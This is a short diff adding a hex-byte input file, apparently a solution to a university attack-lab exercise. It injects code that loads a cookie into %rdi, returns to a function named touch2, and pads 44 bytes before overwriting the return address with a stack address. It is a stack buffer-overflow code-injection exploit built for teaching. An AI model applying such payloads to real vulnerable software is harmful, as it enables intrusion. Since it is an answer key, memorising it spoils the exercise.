@@ -1,0 +1,9 @@
+bf fa 97 b9 59  /* mov cookie to %rdi */
+68 ec 17 40 00  /* return to touch2 */
+c3 00 00 00 00  /* 44 bytes */
+00 00 00 00 00
+00 00 00 00 00 
+00 00 00 00 00 
+00 00 00 00 00
+00 00 00 00 00 
+78 dc 61 55  /* address of %rsp */  
